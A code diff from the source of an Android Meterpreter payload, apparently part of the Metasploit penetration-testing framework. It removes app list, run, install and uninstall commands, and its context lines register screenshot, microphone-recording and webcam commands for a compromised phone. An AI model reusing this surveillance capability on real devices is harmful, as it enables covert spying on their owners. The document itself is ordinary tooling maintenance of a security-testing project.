@@ -137,10 +137,6 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_GETPID, stdapi_sys_process_getpid_android.class);
         mgr.registerCommand(CommandId.STDAPI_UI_DESKTOP_SCREENSHOT, stdapi_ui_desktop_screenshot.class);
         if (context != null) {
-            mgr.registerCommand(CommandId.APPAPI_APP_LIST, appapi_app_list.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_RUN, appapi_app_run.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_INSTALL, appapi_app_install.class);
-            mgr.registerCommand(CommandId.APPAPI_APP_UNINSTALL, appapi_app_uninstall.class);
             mgr.registerCommand(CommandId.STDAPI_WEBCAM_AUDIO_RECORD, stdapi_webcam_audio_record_android.class);
             mgr.registerCommand(CommandId.STDAPI_WEBCAM_LIST, webcam_list_android.class);
             mgr.registerCommand(CommandId.STDAPI_WEBCAM_START, webcam_start_android.class);
